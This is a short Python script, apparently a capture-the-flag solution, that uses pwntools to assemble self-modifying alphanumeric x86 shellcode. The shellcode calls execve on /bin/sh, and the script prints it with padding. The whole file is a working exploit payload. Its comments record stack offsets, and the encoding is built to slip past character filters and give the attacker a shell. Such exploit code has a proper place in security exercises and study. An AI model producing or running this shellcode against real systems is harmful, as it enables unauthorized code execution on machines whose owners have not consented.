from pwn import *

# esp = 0xfffbd0c, eip = 0xfffbd2c, len = 89, offset = 12
# esp = esp + 0x8f
# push 0x474780cd
# esp = esp - 0x60
# execve(/bin/sh, /bin/sh, 0)
shellcode = """
push esp
pop eax
sub eax, 0x39393323
sub eax, 0x72727625
sub eax, 0x54545629
push eax
pop esp

push 0x47474130
pop eax
xor ax, 0x4130
dec eax
xor ax, 0x3041
xor ax, 0x4f73
push eax

push esp
push eax
pop eax
pop eax
sub eax, 0x39393373
sub eax, 0x72727675
sub eax, 0x54545678
push eax
pop esp

push 0x30
pop eax
xor al, 0x30
push eax
pop edx
push eax
push 0x68732f2f
push 0x6e69622f
push esp
pop ebx
push eax
push ebx
push esp
pop ecx
push 0x38
pop eax
xor al, 0x33
"""
payload = asm(shellcode)
payload += "G"*10

print(payload)
